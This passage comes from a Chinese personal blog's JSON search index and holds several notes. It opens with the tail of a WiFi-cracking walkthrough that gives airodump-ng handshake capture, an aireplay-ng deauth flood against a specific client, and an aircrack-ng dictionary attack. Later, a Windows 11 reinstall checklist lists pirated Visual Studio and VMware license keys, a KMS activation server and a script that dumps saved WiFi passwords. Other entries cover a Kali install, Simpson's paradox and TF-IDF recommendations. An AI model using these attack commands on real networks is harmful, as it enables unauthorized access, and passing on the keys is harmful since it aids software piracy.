：这个就不用多说了，wifi名称，有中文可能会出现乱码哈 目标有了，开始对其进行 cap 包的监听和获取，这里要让其中连接的设备重连才能抓包其握手包，可以慢慢等待，也可以使用 deauth 洪水攻击。 airodump-ng -c 9 --bssid 78:11:DC:10:4F:66 -w /root/handshake/ wlan0mon# -w 后面的路径是存放握手包的 另起窗口，我们用 deauth 洪水攻击，让其中的一台设备掉线，它掉线后会自动连接（除非别人在 wifi 设置中勾选掉了自动连接） aireplay-ng -0 20 -a 78:11:DC:10:4F:66 -c 6C:88:14:F2:47:8C wlan0mon# -0 death模式，20为攻击次数，也可以设为0，就是一直攻击# -c 这里就是连接上的设备的MAC地址了，指定它，我们让它稳稳地掉线。 上字典（关键东西），让它慢慢破去吧 root@huan:~#aircrack-ng -w /root/wordlist.txt /root/handshake/-02.cap"},{"title":"制作 Kali 的 U 盘启动盘","date":"2022-09-09T06:09:00.000Z","updated":"2022-09-10T04:00:00.000Z","comments":true,"path":"notes/c/k/ukali.html","permalink":"https://blog.mhuig.top/notes/c/k/ukali","excerpt":"","text":"前期准备 一个 U 盘 官方 kali 裸机镜像 https://www.kali.org/get-kali/#kali-bare-metal 笔者这里下载的是 kali-linux-2022.3-installer-amd64.iso 虚拟机配置打开虚拟机。 选择安装镜像文件。 选择客户机操作系统 选择 debian10.x 64 位。 命名虚拟机，名称自定义；位置默认即可。 指定磁盘容量 默认，后面会删除虚拟机磁盘。 准备好虚拟机 编辑虚拟机设置 网络连接选择桥接模式 USB 选最大 3.0 以上 移除硬盘 添加硬盘 》SCSI 》使用物理磁盘 》选择设备（PD1） 》使用单个分区 》选择分区。 开启虚拟机，F2 进入 BIOS，从 CD / DVD 启动，此时将会打开 iso 镜像开始运行。 运行安装选择图形化安装 (Graphical install). 选择语言，我这里选中文简体 选择位置 中国 配置键盘 汉语 探测并挂载安装介质 配置网络 默认 域名空就行继续 设置用户名和密码 对磁盘进行分区 使用整个磁盘并配置加密的 LVM 选择要分区的磁盘继续 将修改写入磁盘并写入 LVM 吗？ 选择是。 擦除数据 设置加密密码句 结束分区设定并将修改写入磁盘 安装基本系统 图形桌面选择 Xface 选择并安装软件。。。。 安装 GREB 启动引擎 选择是 /dev/sda 结束安装进程 物理机运行进 BIOS 安全选项里面关闭 secure boot"},{"title":"Tree Hollow","date":"2022-06-13T08:10:00.000Z","updated":"2022-09-03T01:42:00.000Z","comments":true,"path":"wiki/CoPoKo/tree-hollow.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/tree-hollow","excerpt":"","text":"假定您的 Worker 路由是 https://example.workers.dev/。 简介CoPoKo/Hole 是树洞！！！ 配置信息&lt;!-- CSS --&gt;&lt;link href=\"https://unpkgg.com/@copoko/hole/dist/Hole.css\" rel=\"stylesheet\"&gt;&lt;!-- JS --&gt;&lt;script src=\"https://unpkkg.com/@copoko/hole/dist/Hole.js\"&gt;&lt;/script&gt;&lt;!-- Hole --&gt;&lt;div id=\"Hole\"&gt;&lt;/div&gt;&lt;script&gt; new Hole({ api: \"https://xxxxxx.workers.dev\", id: \"#Hole\", limit: 10, });&lt;/script&gt; 使用CoPoKo Space 部分： 碎言碎语/pages/talk/ Telegram 机器人部分咕咕咕了，可能会和频道打通。"}],"posts":[{"title":"","slug":"notes/Zeta","date":"2025-09-14T06:59:00.000Z","updated":"2025-09-14T06:50:00.000Z","comments":false,"path":"p/zeta-archive/","permalink":"https://blog.mhuig.top/p/zeta-archive/","excerpt":"","text":"Zeta Archive Zeta Archive 开始阅读","categories":[{"name":"Zeta","slug":"Zeta","permalink":"https://blog.mhuig.top/categories/Zeta/"}],"tags":[{"name":"Zeta","slug":"Zeta","permalink":"https://blog.mhuig.top/tags/Zeta/"}]},{"title":"","slug":"notes/datacom","date":"2023-12-03T05:59:00.000Z","updated":"2023-12-03T06:48:00.000Z","comments":false,"path":"p/notes-datacom/","permalink":"https://blog.mhuig.top/p/notes-datacom/","excerpt":"","text":".fa-secondary{opacity:.4} 数据通信网络 数据通信网络 开始阅读","categories":[{"name":"数据通信网络","slug":"数据通信网络","permalink":"https://blog.mhuig.top/categories/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"数据通信网络","slug":"数据通信网络","permalink":"https://blog.mhuig.top/tags/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C/"}]},{"title":"辛普森悖论|你还相信数据吗","slug":"pen/辛普森悖论","date":"2022-09-22T08:14:00.000Z","updated":"2022-09-22T08:14:00.000Z","comments":true,"path":"p/2f345bb/","permalink":"https://blog.mhuig.top/p/2f345bb/","excerpt":"","text":"数据是一个有力的武器，它既能被用来澄清现实，也能被用来混淆是非 你知不知道，数据也会说谎？ 一个栗子假设您患有肾结石并去看医生。医生告诉你有两种治疗方法，治疗 A（开放手术 open surgery）和治疗 B（体外冲击波碎石术 ESWL）。 你问哪种治疗效果更好，医生说：“一项研究发现治疗 A 的成功概率高于治疗 B。” 你说：“我会接受治疗 A，谢谢！” 这时医生打断你，“但同样的研究还研究了哪种治疗效果更好，这取决于患者是大肾结石还是小肾结石。” 你说：“好吧，我有大肾结石还是小肾结石？” 你说话的时候，医生又打断了你，说：“其实没关系。你看，他们发现治疗 B 比治疗 A 成功的概率更高，不管你的肾结石是大还是小。” 你可能想知道你是否没看错。听起来不可能。但这是真的：在一项实际研究中，发现治疗 B 比治疗 A 对大肾结石和小肾结石起作用的概率更高，尽管事实上治疗 A 的总体 概率高于治疗 B。这是研究数据： 治疗 A 有帮助 治疗 B 有帮助 大肾结石 69% (55 / 80) 73% (192 / 263) 小肾结石 87% (234 / 270) 93% (81 / 87) 所有患者 83% (289 / 350) 78% (273 / 350) 表中的第一项显示，80 名大肾结石患者接受了 A 治疗，治疗帮助了其中 55 人，成功率为 69%。这不如治疗 B 好，它帮助了 263 名大肾结石患者中的 192 人，成功率为 73%。以类似的方式，第二行显示治疗 B 比治疗 A 对患有小肾结石的人更有效。 但是当你把每一列的数字加起来时，你会发现治疗 A 确实比治疗 B 整体效果更好。 值得花时间检查所有数字加起来检验一下，并说服自己我没有欺骗你. 刚刚展示的这种现象被称为辛普森悖论。如果你和包括我在内的大多数人一样，那么辛普森悖论在你第一次见到它时就会令人震惊。因为它违反了我们对世界推理的本能方式。而且，正如我们看到的那样，辛普森悖论不仅是一种怪异的现象，而且它经常在具有重要决策后果的地方出现。 表达式我们抽离出符号表达： 统计对象 1 统计对象 2 分项指标 1 分项指标 2 总计 如果 那么，推不出 以上就是辛普森悖论比较通俗易懂的表达式了。 我们忽略了什么从数据生成过程（因果模型）来看分析. 事实证明，小肾结石被认为是不严重的病例，治疗 B（体外冲击波碎石术 ESWL）比治疗 A（开放手术 open surgery）更加激进。 对于小肾结石，医生更有可能推荐保守疗法 A，因为病情不太严重，患者最有可能首先成功恢复。 对于严重的大肾结石，医生往往选择更激进的疗法 B。即使疗法 B 在这些病例中表现更好，由于是更严重的病例，疗法 B 的总体恢复率低于疗法 A. 在这个现实世界的例子中，肾结石的大小（病例的严重性）是一个混合变量，它会同时影响自变量（疗法）和因变量（恢复率）. 疗法病例的严重性 恢复率疗法病例的严重性 为了确定哪种治疗方法确实更好，我们需要通过对两组数据进行分离并比较组内的恢复率而不是按组聚合来控制混合变量。 小肾结石恢复率疗法 大肾结石恢复率疗法 这样看来激进的治疗 B（体外冲击波碎石术 ESWL）效果更好. 如果有潜在变量（特别是混合变量）存在，牢记：整体数据未必可靠，要通过科学合理的分组来查看具体细致的数据。 启示 数据从来都不是完全客观的. 我们必须对这些数字持怀疑态度. 辛普森悖论的出现是因为人们忽略了研究的因果关系，一旦我们理解了数据生成的机制，我们就可以寻找影响结果的其他因素，而图表不会告诉你这些. 充分考察事件的潜在影响因素和维度，系数消除分组数据基数差异造成的影响. 要求我们具备科学辩证思维，客观看待关联现象。很多时候，我们选择相信直觉，因为我们的直觉往往很准。但是，在信息不全或者信息非对称的情况下，直觉常常是是值得怀疑的。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"尝试在博客中添加简易文章推荐功能","slug":"data-mining/尝试在博客中添加文章推荐功能","date":"2022-09-15T11:13:00.000Z","updated":"2022-09-16T02:48:00.000Z","comments":true,"path":"p/175a1706/","permalink":"https://blog.mhuig.top/p/175a1706/","excerpt":"","text":"把文档转换成 “向量”，并且尝试用线性代数等数学工具来解决信息检索这类问题，至少可以追溯到 20 世纪 70 年代. 想到在 Hexo 这种静态博客系统，特别是 GitHub Page 这种 Serverless 服务中使用 Word2Vec 等深度学习方法似乎并不现实，所以这里使用的是一个非常简单经典的 TF - IDF 算法. TF - IDF 算法原来是搜索引擎中的核心部分，谷歌百度已经使用 TF - IDF 作为内容排名因素很长一段时间. 现在的搜索引擎一般用如下的算法计算网站页面得分：score (页面得分) = TFIDF 分 * x + 链接分 * y + 用户体验分 * z（其中 x + y+z = 100%），TFIDF 分值百度大约占 40% 左右的权重，谷歌更是达到了 50%. 这是百度的计算方法： score (页面得分) = 40% 的内容质量相关性（TFIDF）+ 40% 的用户体验分 + 20% 的链接分（域名 + 外链）. 搜索引擎使用 TF - IDF 来计算内容质量相关性，我们这边也可以用它来计算文章内容相关性，然后实现简易文章推荐功能。 当然也可以使用文章的 tags 标签最为推荐依据，但是这样过于依赖人工标注数据，顺便最近发现在 Hexo 中分类和标签只能在 source/_posts 文件夹中使用才能渲染出来。 构建向量空间模型将文档转化为向量来表示，这样文档与文档之间就可以定量的去度量他们之间的关系，挖掘文档之间的联系. 上面提到的 Word2Vec 是把单词转化为向量来表示，这样词与词之间就可以定量的去度量他们之间的关系，挖掘词之间的联系. 比如将词的维度降维到 2 维，用下图的词向量表示词: 似乎发现了什么不得了的事情。 对于自然语言书写的文本这种非结构化信息，从文本中抽取出的特征来量化来表示文本信息，构建向量空间模型，并基于数学模型的处理，将文本转换为机器可以理解的语言的方式是很重要的。 举个栗子要实现文章推荐，就需要从一堆文章中找出一些内容相似的文章。基本思路就是，如果文章的关键词越相似，那么他们的内容就会越相似。 我们先从几个简单的句子着手。 句子A：我这里有苹果和西瓜。句子B：我喜欢吃西瓜，不喜欢吃苹果。句子C：我喜欢吃蔬菜。 第一步：数据清洗简单去除标点符号等干扰信息。 句子A: 我这里有苹果和西瓜句子B: 我喜欢吃西瓜 不喜欢吃苹果句子C: 我喜欢吃蔬菜 第二步：分词使用分词工具进行分词。 句子A:[ '我', '这里', '有', '苹果', '和', '西瓜' ]句子B:[ '我', '喜欢', '吃', '西瓜', '不', '喜欢', '吃', '苹果']句子C:[ '我', '喜欢', '吃', '蔬菜' ] 第三步：去重收集所有句子中所有的词[ '我', '这里', '有', '苹果', '和', '西瓜', '喜欢', '吃', '不', '蔬菜'] 第四步：计算词频词频背后的假设是文章的重要程度即文章的相关度与单词在文档中出现的次数成正比。文章的关键词应当比文章中的其他词出现的次数多。 词频某个词在文章中出现的次数 句子A:{ '我': 1, '这里': 1, '有': 1, '苹果': 1, '和': 1, '西瓜': 1, '喜欢': 0, '吃': 0, '不': 0, '蔬菜': 0}句子B:{ '我': 1, '这里': 0, '有': 0, '苹果': 1, '和': 0, '西瓜': 1, '喜欢': 2, '吃': 2, '不': 1, '蔬菜': 0}句子C:{ '我': 1, '这里': 0, '有': 0, '苹果': 0, '和': 0, '西瓜': 0, '喜欢': 1, '吃': 1, '不': 0, '蔬菜': 1} 第四步：词频标准化文章的篇幅有长有短，为了便于不同文章的比较，进行 \"词频\" 标准化。词频标准化的目的是把所有的词频在同一维度上分析。 词频标准化有两种方案： 方案一： 词频某个词在文章中出现的次数文章的总词数 方案二： 词频某个词在文章中出现的次数该文出现最多的词出现的次数 一般情况下，第二个标准化方案更适用，因为能够使词频的值相对大点，便于分析。 有时候常常用 这个值来代替原来的 TF 取值。这样的计算保持了一个平衡，既有区分度，但也不至于完全线性增长。 这里使用比较简单的方案一作为栗子： 句子A:{ '我': 0.16666666666666666, '这里': 0.16666666666666666, '有': 0.16666666666666666, '苹果': 0.16666666666666666, '和': 0.16666666666666666, '西瓜': 0.16666666666666666, '喜欢': 0, '吃': 0, '不': 0, '蔬菜': 0}句子B:{ '我': 0.125, '这里': 0, '有': 0, '苹果': 0.125, '和': 0, '西瓜': 0.125, '喜欢': 0.25, '吃': 0.25, '不': 0.125, '蔬菜': 0}句子C:{ '我': 0.25, '这里': 0, '有': 0, '苹果': 0, '和': 0, '西瓜': 0, '喜欢': 0.25, '吃': 0.25, '不': 0, '蔬菜': 0.25} 第五步：计算逆文档频率仅有词频 (TF) 不能比较完整地描述文档的相关度。因为语言的因素，有一些单词可能会比较自然地在很多文档中反复出现，比如这里中的 “我”、“和” 等等。这些词大多起到了链接语句的作用，是保持语言连贯不可或缺的部分。 很明显，如果有太多文档都涵盖了某个单词，这个单词也就越不重要，或者说是这个单词就越没有信息量。因此，我们需要对词频 (TF) 的值进行修正，而 逆文档频率 (IDF) 的想法是用文档频率 (DF) 的倒数来进行修正。 逆文档频率语料库的文档总数包含该词的文档数 如果一个词越常见，那么分母就越大，逆文档频率就越小越接近 0。分母之所以要加 1，是为了避免分母为 0（即所有文档都不包含该词）。log 表示对得到的值取对数。为什么要用 log 函数？log 函数是单调递增，求 log 是为了归一化，保证逆文档频率不会过大。用 Log 进行变换，也是一个非线性增长的技巧，这样的计算保持了一个平衡，既有区分度，但也不至于完全线性增长。 句子A:{ '我': -0.2876820724517809, '这里': 0.4054651081081644, '有': 0.4054651081081644, '苹果': 0, '和': 0.4054651081081644, '西瓜': 0, '喜欢': 0, '吃': 0, '不': 0.4054651081081644, '蔬菜': 0.4054651081081644}句子B:{ '我': -0.2876820724517809, '这里': 0.4054651081081644, '有': 0.4054651081081644, '苹果': 0, '和': 0.4054651081081644, '西瓜': 0, '喜欢': 0, '吃': 0, '不': 0.4054651081081644, '蔬菜': 0.4054651081081644}句子C:{ '我': -0.2876820724517809, '这里': 0.4054651081081644, '有': 0.4054651081081644, '苹果': 0, '和': 0.4054651081081644, '西瓜': 0, '喜欢': 0, '吃': 0, '不': 0.4054651081081644, '蔬菜': 0.4054651081081644} 第六步：计算 TF - IDF词频逆文档频率 可以看到，TF - IDF 与一个词在文档中的出现次数成正比，与该词在整个文档库中的出现次数成反比。 句子A:{ '我': -0.047947012075296815, '这里': 0.06757751801802739, '有': 0.06757751801802739, '苹果': 0, '和': 0.06757751801802739, '西瓜': 0, '喜欢': 0, '吃': 0, '不': 0, '蔬菜': 0}句子B:{ '我': -0.03596025905647261, '这里': 0, '有': 0, '苹果': 0, '和': 0, '西瓜': 0, '喜欢': 0, '吃': 0, '不': 0.05068313851352055, '蔬菜': 0}句子C:{ '我': -0.07192051811294523, '这里': 0, '有': 0, '苹果': 0, '和': 0, '西瓜': 0, '喜欢': 0, '吃': 0, '不': 0, '蔬菜': 0.1013662770270411} 第七步：列出文档向量这里准确来说应该是 TF - IDF 特征向量，这是一个稀疏矩阵。下面把它作为描述文章特征的向量。 说明一点，这里的文章的特征不是由某几个关键词的 TF - IDF 值决定的，而是由所有的词的 TF - IDF 值共同决定的。 句子A:[ -0.047947012075296815, 0.06757751801802739, 0.06757751801802739, 0, 0.06757751801802739, 0, 0, 0, 0, 0]句子B:[ -0.03596025905647261, 0, 0, 0, 0, 0, 0, 0, 0.05068313851352055, 0]句子C:[ -0.07192051811294523, 0, 0, 0, 0, 0, 0, 0, 0, 0.1013662770270411] 可以对文档向量进行标准化，使得这些向量能够不受向量里有效元素多少的影响，也就是不同的文档可能有不同的长度。把向量都标准化为一个单位向量的长度。这个时候再进行点积运算，就相当于在原来的向量上进行余弦相似度的运算。 第八步：计算余弦相似度到这里，如何寻找两篇相似文章的问题转变成了如何计算这两个向量的相似程度的问题。 什么叫做向量相似？ 一般地，如果两个向量平行或重合，我们认为这两个向量相似度为 。如果这两个向量垂直，或者说正交，我们认为这两个向量的相似度为 。 以二维空间为例， 和 是两个向量，我们要计算它们的夹角 。余弦定理告诉我们，可以用下面的公式求得： 假定和是两个维向量，我们把这些向量放到维欧几里得空间中讨论，向量之间的距离使用欧几里得距离。 假定是 ，是 ，则与的夹角的余弦等于： { '句子A': { '句子A': 1.0000000000000002, '句子B': 0.21934876427664535, '句子C': 0.21934876427664535 }, '句子B': { '句子A': 0.21934876427664535, '句子B': 1, '句子C': 0.33484380220099325 }, '句子C': { '句子A': 0.21934876427664535, '句子B': 0.33484380220099325, '句子C': 1 }} 第九步：余弦相似度按照降序排序两两计算向量夹角的余弦值，然后按降序排列，取排在最前面的几个文章，就是相似度较高的文章，作为推荐结果。 { '句子A': { '句子A': 1.0000000000000002, '句子B': 0.21934876427664535, '句子C': 0.21934876427664535 }, '句子B': { '句子B': 1, '句子C': 0.33484380220099325, '句子A': 0.21934876427664535 }, '句子C': { '句子C': 1, '句子B': 0.33484380220099325, '句子A': 0.21934876427664535, }} 相同句子的余弦值是 .余弦值越接近，就表明夹角越接近度，也就是两个向量越相似. 第十步：收集推荐结果{ '句子A': [ '句子B', '句子C' ], '句子B': [ '句子C', '句子A' ], '句子C': [ '句子B', '句子A' ]} 即： A-BB-CC-B A 和 C 之间没什么关系。 源码实现Volantis 主题实现文章推荐https://github.com/volantis-x/hexo-theme-volantis/blob/684c40333b16b5d1df1a9e4a7f1da90216e5a17a/scripts/helpers/ 文章推荐.js UI 界面是随手写的，又不是不能用（ 代码变量是中文写的，方便易读。其实是中间出 Bug 了，然后调试 Debug 时顺便整的活","categories":[{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/categories/Data-mining/"}],"tags":[{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/tags/Data-mining/"},{"name":"推荐系统","slug":"推荐系统","permalink":"https://blog.mhuig.top/tags/%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F/"}]},{"title":"记一次重装系统 (Win11)","slug":"win11","date":"2022-08-11T01:18:00.000Z","updated":"2022-08-11T01:18:00.000Z","comments":true,"path":"p/de4b9576/","permalink":"https://blog.mhuig.top/p/de4b9576/","excerpt":"","text":"电脑开机后要先卡顿 30 min，然后才能正常工作，还有不明程序一直在读写磁盘，噪声太大了，没救了重装系统吧。 重装系统之后操作瞬间就流畅很多~ 意料之外：重装系统之后，win11 自带的杀软开始报毒，之前在虚拟机看过镜像中是没有这个病毒文件的。使用老毛桃制作启动盘，事先格式了系统盘，推测可能是老毛桃启动盘释放的病毒文件，或者是上一个系统的隐藏分区释放的病毒文件，google: 老毛桃启动盘携带木马病毒，这里建议使用微软官方的镜像和安装介质。 重装系统前的备份列表 以下内容适用于 win10 与 win11 PE 官方镜像和安装介质 老毛桃 UEFI 版 操作系统 windows 镜像库 Win11 安装跳过 tpm 2.0 检测的方法 TPM 对笔者来说毫无用处 打开 Windows 11 的 ISO 镜像安装包，打开后将目录 Source 中的 install.wim 文件复制到桌面上。然后解压 Windows 10 的 ISO 安装包，然后将 Win11 的 install.win 文件拷到解压后的 win10 安装包的 sources 文件夹，双击 Windows 10 安装包里的 setup.exe 文件开始安装，借用 Windows10 安装程序去安装 Windows11 系统 W10 Digital License Activation Script 笔者发现装完系统以后 win11 已经激活了，是因为之前使用了 W10 Digital License Activation Script。 Office Office 镜像库 Office Tool Plus Office Tool Plus 入门教程 kms list kms.loli.best 1688 浏览器 Chrome Firefox Tor Browser 安全管理 火绒安全 腾讯电脑管家 Kaspersky 暂时只装火绒。 Windows 应用商店 7-zip Ubuntu On windows Kali Linux IDE 文本编辑器 Visual Studio Code Visual Studio vs2022 永久激活密钥：Visual Studio 2022 Enterprise：VHF9H-NXBBB-638P6-6JHCY-88JWHVisual Studio 2022 Professional：TD244-P4NB7-YQ6XK-Y8MMM-YWV2J CodeBlocks JetBrains Pycharm JetBrains Idea https://www.exception.site/essay/how-to-free-use-intellij-idea-2019-3 Notepad++ Eclipse MyEclipse Typora Matlab 代理工具 Clash for Windows V2rayN ShadowsocketsR DOH 阿里：https://dns.alidns.com/dns-query 腾讯：https://doh.pub/dns-query 驱动 NVIDIA ATK Package cuda cudnn 开发环境 TDM-GCC x64 python pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple Writing to %appdata%\\pip\\pip.ini anaconda Java SE Development Kit nvm 找到 nvm 文件位置，点开 settings.txt root: C:\\software\\nvmpath: C:\\software\\nodejsnode_mirror: https://npm.taobao.org/mirrors/node/npm_mirror: https://npm.taobao.org/mirrors/npm/ 使用 nvm ls // 看安装的所有node.js的版本nvm list available // 查显示可以安装的所有node.js的版本nvm install 版本号 // 例如：nvm install 16.16.0nvm use 版本号 // 切换到使用指定的nodejs版本 版本控制 Git GitHub DeskTop 配置 .gitconfig .gitconfig[user] name = MHuiG email = xxxxxx@qq.com signingkey = BA16368BD4C4169C[gui] encoding = utf-8[filter \"lfs\"] smudge = git-lfs smudge -- %f process = git-lfs filter-process required = true clean = git-lfs clean -- %f[http] schannelCheckRevoke = false[commit] gpgsign = true[gpg] program = C:\\\\software\\\\GnuPG\\\\bin\\\\gpg.exe[init] defaultBranch = main[core] editor = \\\"C:\\\\software\\\\Microsoft VS Code\\\\bin\\\\code\\\" --wait 聊天工具 QQ 微信 企业微信 Telegram Desktop 远程连接 Xshell Xftp SecureCRT VNC 数据库 MySQL Navicat mongoDB Robo 3T redis RedisDesktopManager 截屏工具 ScreenToGif Greenshot GPG keybase Gpg4win 下载工具 迅雷 百度网盘 Aria2 杂项 搜狗输入法 VMware 16: ZF3R0-FHED2-M80TY-8QYGC-NPKYF XMind PostMan 网易有道词典 CAJViewer BestTrace StarUML HDFView Adobe Photo Shop 网易云音乐 MathType PotPlayerPortable Dism++ UltraISO MyDiskTest DiskGenius chrome 扩展 AdBlock — 最佳广告拦截工具 Enable Copy MetaMask Tampermonkey BETA Wappalyzer - Technology profiler 迅雷下载支持 windows 导出备份 WiFi 密码Wi-Fi-code.bat@echo off for /f \"skip=9 tokens=1,2 delims=:\" %%i in ('netsh wlan show profiles') do @echo %%j | findstr -i -v echo | netsh wlan show profiles %%j key=clear &gt;&gt;%USERPROFILE%\\desktop\\Wi-Fi-code.txtstart %USERPROFILE%\\desktop\\Wi-Fi-code.txt windows 提权装完系统先搞权限。 夺回 Windows 系统权限碰到过这样的提示：“无法使用内置管理员账户打开 XX 程序，请使用其他账户登录” 其实已经使用管理员账户登录了，为什么还会出现这样的提示呢？ 这是因为使用的内置账户没有对应用程序的操作权限，可以使用注册表来夺回 Windows10 系统权限。 账户详解： 使用的管理员账户，就是使用用户名或微软账号登录到 Windows 的账号，管理权限无限近似于 Administrator，但在某些文件 / 文件夹的操作上，还是不如真正的 Administrator 好用。 在 Windows 内置的账户中，还有两个比 Administrator 权限更高的账户，一个是肉眼可见的 System 权限，最终的 Boss 则是 TrustedInstaller，其实所有账户中它也不是最高的那个，但剩下的无论通过什么方式，都挖掘不出来了，也许超级账户就是 Microsoft 自己了。 Windows 夺回系统权限的操作方法： 1、Win+R 组合键之后，输入 regedit ，打开注册表； 2、定位到：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System ，在右侧栏找到 FilterAdministratorToken ，双击后将数值数据修改为 1之后点击 确定。（如果没有的话，就使用鼠标右键新建个 DWORD（32位） 值，将其命名为 FilterAdministratorToken 。） 3、之后再定位到：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\UIPI ，将右侧的默认项目的数值数据修改为 1。 4、完成上述操作后，重启电脑或注销当前 Windows 账户后，再进入 “控制面板 - 系统与安全 - 用户账户控制设置”，将 “通知选项” 设置为默认就 OK 了。 开启 administrator 账户net user administrator /active:yes 右键菜单权限选项管理员取得所有权.regWindows Registry Editor Version 5.00[-HKEY_CLASSES_ROOT\\*\\shell\\runas][HKEY_CLASSES_ROOT\\*\\shell\\runas]@=\"获取超级管理员权限\"\"Icon\"=\"C:\\\\Windows\\\\System32\\\\imageres.dll,-78\"\"NoWorkingDirectory\"=\"\"[HKEY_CLASSES_ROOT\\*\\shell\\runas\\command]@=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /grant administrators:F\"\"IsolatedCommand\"=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /grant administrators:F\"[-HKEY_CLASSES_ROOT\\Directory\\shell\\runas][HKEY_CLASSES_ROOT\\Directory\\shell\\runas]@=\"获取超级管理员权限\"\"Icon\"=\"C:\\\\Windows\\\\System32\\\\imageres.dll,-78\"\"NoWorkingDirectory\"=\"\"[HKEY_CLASSES_ROOT\\Directory\\shell\\runas\\command]@=\"cmd.exe /c takeown /f \\\"%1\\\" /r /d y &amp;&amp; icacls \\\"%1\\\" /grant administrators:F /t\"\"IsolatedCommand\"=\"cmd.exe /c takeown /f \\\"%1\\\" /r /d y &amp;&amp; icacls \\\"%1\\\" /grant administrators:F /t\"[-HKEY_CLASSES_ROOT\\dllfile\\shell][HKEY_CLASSES_ROOT\\dllfile\\shell\\runas]@=\"获取超级管理员权限\"\"HasLUAShield\"=\"\"\"NoWorkingDirectory\"=\"\"[HKEY_CLASSES_ROOT\\dllfile\\shell\\runas\\command]@=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /grant administrators:F\"\"IsolatedCommand\"=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /grant administrators:F\"[-HKEY_CLASSES_ROOT\\Drive\\shell\\runas][HKEY_CLASSES_ROOT\\Drive\\shell\\runas]@=\"获取超级管理员权限\"\"Icon\"=\"C:\\\\Windows\\\\System32\\\\imageres.dll,-78\"\"NoWorkingDirectory\"=\"\"[HKEY_CLASSES_ROOT\\Drive\\shell\\runas\\command]@=\"cmd.exe /c takeown /f \\\"%1\\\" /r /d y &amp;&amp; icacls \\\"%1\\\" /grant administrators:F /t\"\"IsolatedCommand\"=\"cmd.exe /c takeown /f \\\"%1\\\" /r /d y &amp;&amp; icacls \\\"%1\\\" /grant administrators:F /t\" 恢复原始权限.regWindows Registry Editor Version 5.00;恢复原始权限 [HKEY_CLASSES_ROOT\\*\\shell\\runas-] @=\"恢复原始权限\"\"Icon\"=\"C:\\\\Windows\\\\System32\\\\imageres.dll,101\"\"NoWorkingDirectory\"=\"\"; &amp;&amp; takeown /f \\\"%1\\\"[HKEY_CLASSES_ROOT\\*\\shell\\runas-\\command] @=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /reset &amp;&amp; cacls \\\"%1\\\" /e /r \\\"%%USERNAME%%\\\"\"\"IsolatedCommand\"=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /reset &amp;&amp; cacls \\\"%1\\\" /e /r \\\"%%USERNAME%%\\\"\"[HKEY_CLASSES_ROOT\\exefile\\shell\\runas2-] @=\"恢复原始权限\"\"Icon\"=\"C:\\\\Windows\\\\System32\\\\imageres.dll,101\"\"NoWorkingDirectory\"=\"\"[HKEY_CLASSES_ROOT\\exefile\\shell\\runas2-\\command] @=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /reset &amp;&amp; cacls \\\"%1\\\" /e /r \\\"%%USERNAME%%\\\"\"\"IsolatedCommand\"=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /reset &amp;&amp; cacls \\\"%1\\\" /e /r \\\"%%USERNAME%%\\\"\"[HKEY_CLASSES_ROOT\\Directory\\shell\\runas-] @=\"恢复原始权限\"\"Icon\"=\"C:\\\\Windows\\\\System32\\\\imageres.dll,101\"\"NoWorkingDirectory\"=\"\"[HKEY_CLASSES_ROOT\\Directory\\shell\\runas-\\command] @=\"cmd.exe /c takeown /f \\\"%1\\\" /r /d y &amp;&amp; icacls \\\"%1\\\" /reset &amp;&amp; cacls \\\"%1\\\" /e /r \\\"%%USERNAME%%\\\"\"\"IsolatedCommand\"=\"cmd.exe /c takeown /f \\\"%1\\\" /r /d y &amp;&amp; icacls \\\"%1\\\" /reset &amp;&amp; cacls \\\"%1\\\" /e /r \\\"%%USERNAME%%\\\"\" 取得文件修改权限.regWindows Registry Editor Version 5.00;取得文件修改权限 [HKEY_CLASSES_ROOT\\*\\shell\\runas] @=\"获取管理员权限\"\"Icon\"=\"C:\\\\Windows\\\\System32\\\\imageres.dll,102\"\"NoWorkingDirectory\"=\"\"[HKEY_CLASSES_ROOT\\*\\shell\\runas\\command] @=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /grant administrators:F\"\"IsolatedCommand\"=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /grant administrators:F\"[HKEY_CLASSES_ROOT\\exefile\\shell\\runas2] @=\"获取管理员权限\"\"Icon\"=\"C:\\\\Windows\\\\System32\\\\imageres.dll,102\"\"NoWorkingDirectory\"=\"\"[HKEY_CLASSES_ROOT\\exefile\\shell\\runas2\\command] @=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /grant administrators:F\"\"IsolatedCommand\"=\"cmd.exe /c takeown /f \\\"%1\\\" &amp;&amp; icacls \\\"%1\\\" /grant administrators:F\"[HKEY_CLASSES_ROOT\\Directory\\shell\\runas] 